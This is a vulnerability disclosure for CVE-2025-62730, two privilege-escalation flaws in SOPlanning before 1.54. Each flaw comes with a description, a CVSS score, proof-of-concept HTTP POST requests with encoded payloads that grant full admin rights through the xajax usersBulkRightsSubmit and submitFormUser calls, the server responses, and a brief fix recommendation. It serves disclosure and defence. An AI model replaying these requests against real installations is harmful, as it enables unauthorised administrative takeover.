# (CVE-2025-62730) Privilege Escalation - Bulk Update

## üìù Description
>Privilege Escalation (PE) vulnerability in SOPlanning <1.54, due to lack of proper authorization check. Users with the "user_manage_role" could escalate their privileges via usersBulkRightsSubmit xajax functionality to full administrative account.
## üìà CVSS Score
- **Base Score:**  8.7 (High)
- **Vector String:** CVSS:3.1AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H

## üß™ Proof of Concept (PoC)
> If the user had role "user_manage_team" was able to escalate to the full admin using the Bulk rights update.
> ![[Pasted image 20250724124157.png]]
> Then the attacker needed to filter on himself and choose all the rights:
> ![[Pasted image 20250724123745.png]]
Request:
```
POST /process/xajax_server HTTP/2

Host: lukasz.soplanning.pro

Cookie: baseLigne=users; baseColonne=jours; afficherTableauRecap=1; xposMoisWin=0; xposJoursWin=0; yposJoursWin=0; masquerLigneVide=1; sop5834planning_=8shn0sbclf34tl1dooh05mv6cl; date_debut_affiche=19%2F07%2F2025; date_fin_affiche=04%2F09%2F2025; dateDebut=19/07/2025; dateFin=04/09/2025; dimensionCase=reduit; yposMoisWin=0
[...]



xajax=usersBulkRightsSubmit&xajaxr=1753353472876&xajaxargs[]=%3Cxjxobj%3E%3Ce%3E%3Ck%3E0%3C%2Fk%3E%3Cv%3Ebasic%3C%2Fv%3E%3C%2Fe%3E%3C%2Fxjxobj%3E&xajaxargs[]=%3Cxjxobj%3E%3Ce%3E%3Ck%3E0%3C%2Fk%3E%3Cv%3Eusers_manage_all%3C%2Fv%3E%3C%2Fe%3E%3Ce%3E%3Ck%3E1%3C%2Fk%3E%3Cv%3Eprojects_manage_all%3C%2Fv%3E%3C%2Fe%3E%3Ce%3E%3Ck%3E2%3C%2Fk%3E%3Cv%3Eprojectgroups_manage_all%3C%2Fv%3E%3C%2Fe%3E%3Ce%3E%3Ck%3E3%3C%2Fk%3E%3Cv%3Etasks_modify_all%3C%2Fv%3E%3C%2Fe%3E%3Ce%3E%3Ck%3E4%3C%2Fk%3E%3Cv%3Etasks_view_all_projects%3C%2Fv%3E%3C%2Fe%3E%3Ce%3E%3Ck%3E5%3C%2Fk%3E%3Cv%3Etasks_view_all_users%3C%2Fv%3E%3C%2Fe%3E%3Ce%3E%3Ck%3E6%3C%2Fk%3E%3Cv%3Elieux_all%3C%2Fv%3E%3C%2Fe%3E%3Ce%3E%3Ck%3E7%3C%2Fk%3E%3Cv%3Eressources_all%3C%2Fv%3E%3C%2Fe%3E%3Ce%3E%3Ck%3E8%3C%2Fk%3E%3Cv%3Eparameters_all%3C%2Fv%3E%3C%2Fe%3E%3Ce%3E%3Ck%3E9%3C%2Fk%3E%3Cv%3Estats_users%3C%2Fv%3E%3C%2Fe%3E%3Ce%3E%3Ck%3E10%3C%2Fk%3E%3Cv%3Estats_projects%3C%2Fv%3E%3C%2Fe%3E%3C%2Fxjxobj%3E&xajaxargs[]=%3Cxjxobj%3E%3C%2Fxjxobj%3E&xajaxargs[]=%3Cxjxobj%3E%3C%2Fxjxobj%3E	
```
Response
```
HTTP/2 200 OK
[...]



<?xml version="1.0" encoding="utf-8" ?><xjx><cmd n="js"><![CDATA[location.reload();]]></cmd></xjx>
```

Then the user become a full admin.

## üõ†Ô∏è Recommendation / Fix

Implement a proper authorization - role checking.

# (CVE-2025-62730) Privilege Escalation - User edition

## üìù Description
> Privilege Escalation (PE) vulnerability in SOPlanning <1.54, due to lack of proper authorization check. Users with the "user_manage_role" could escalate their privileges via submitFormUser xajax functionality to full administrative account.
## üìà CVSS Score
- **Base Score:**  8.7 (High)
- **Vector String:** CVSS:3.1AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H

## üß™ Proof of Concept (PoC)
> If the user had role "user_manage_team" was able to escalate to the full admin using the user edition or creation.
> ![[Pasted image 20250724124601.png]]
> Then the attacker needed to add new user or edit any user. Moreover intercepting the  request and exchanged the null value to users_manage_all:
> **Request:**
```
POST /process/xajax_server HTTP/2

Host: lukasz.soplanning.pro

Cookie: baseLigne=users; baseColonne=jours; afficherTableauRecap=1; xposMoisWin=0; xposJoursWin=0; yposJoursWin=0; masquerLigneVide=1; sop5834planning_=8shn0sbclf34tl1dooh05mv6cl; date_debut_affiche=19%2F07%2F2025; date_fin_affiche=04%2F09%2F2025; dateDebut=19/07/2025; dateFin=04/09/2025; dimensionCase=reduit; yposMoisWin=0
[...]


xajax=submitFormUser&xajaxr=1753353875912&xajaxargs[]=PE&xajaxargs[]=&xajaxargs[]=1&xajaxargs[]=PE&xajaxargs[]=&xajaxargs[]=PE&xajaxargs[]=a&xajaxargs[]=true&xajaxargs[]=%23FFFFFF&xajaxargs[]=true&xajaxargs[]=false&xajaxargs[]=%3Cxjxobj%3E%3Ce%3E%3Ck%3E0%3C%2Fk%3E%3Cv%3Eusers_manage_all%3C%2Fv%3E%3C%2Fe%3E%3Ce%3E%3Ck%3E1%3C%2Fk%3E%3Cv%3E%3C%2Fv%3E%3C%2Fe%3E%3Ce%3E%3Ck%3E2%3C%2Fk%3E%3Cv%3E%3C%2Fv%3E%3C%2Fe%3E%3Ce%3E%3Ck%3E3%3C%2Fk%3E%3Cv%3Etasks_readonly%3C%2Fv%3E%3C%2Fe%3E%3Ce%3E%3Ck%3E4%3C%2Fk%3E%3Cv%3Etasks_view_all_projects%3C%2Fv%3E%3C%2Fe%3E%3Ce%3E%3Ck%3E5%3C%2Fk%3E%3Cv%3Etasks_view_all_users%3C%2Fv%3E%3C%2Fe%3E%3Ce%3E%3Ck%3E6%3C%2Fk%3E%3Cv%3E%3C%2Fv%3E%3C%2Fe%3E%3Ce%3E%3Ck%3E7%3C%2Fk%3E%3Cv%3E%3C%2Fv%3E%3C%2Fe%3E%3Ce%3E%3Ck%3E8%3C%2Fk%3E%3Cv%3E%3C%2Fv%3E%3C%2Fe%3E%3Ce%3E%3Ck%3E9%3C%2Fk%3E%3Cv%3E%3C%2Fv%3E%3C%2Fe%3E%3Ce%3E%3Ck%3E10%3C%2Fk%3E%3Cv%3E%3C%2Fv%3E%3C%2Fe%3E%3Ce%3E%3Ck%3E11%3C%2Fk%3E%3Cv%3E%3C%2Fv%3E%3C%2Fe%3E%3Ce%3E%3Ck%3E12%3C%2Fk%3E%3Cv%3E%3C%2Fv%3E%3C%2Fe%3E%3C%2Fxjxobj%3E&xajaxargs[]=&xajaxargs[]=&xajaxargs[]=&xajaxargs[]=&xajaxargs[]=&xajaxargs[]=true&xajaxargs[]=%3Cxjxobj%3E%3C%2Fxjxobj%3E&xajaxargs[]=false&xajaxargs[]=&xajaxargs[]=%3Cxjxobj%3E%3C%2Fxjxobj%3E
```
**Response:**
```
HTTP/2 200 OK
Date: Thu, 24 Jul 2025 10:44:58 GMT
[...]

<?xml version="1.0" encoding="utf-8" ?><xjx><cmd n="js"><![CDATA[window.location = "https://lukasz.soplanning.pro/user_list";]]></cmd></xjx>
```
Then the last step was to log in to newly created account with full admin privileges.

## üõ†Ô∏è Recommendation / Fix

Implement a proper authorization - role checking.
